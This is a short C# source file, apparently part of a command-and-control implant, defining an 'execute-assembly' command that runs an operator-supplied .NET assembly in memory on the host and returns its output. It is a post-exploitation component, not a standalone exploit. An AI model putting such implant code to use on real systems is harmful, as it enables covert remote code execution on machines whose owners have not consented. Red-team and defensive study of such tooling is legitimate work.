using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class ExecuteAssemblyCommand : AgentCommand
    {
        public override string Name => "execute-assembly";

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            this.CheckFileDownloaded(task, context);

            
            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
            var args = task.SplittedArgs.ToList();
            var output = Executor.ExecuteAssembly(file.GetFileContent(), args.ToArray());

            context.Result.Result = output;
        }

       
    }
}
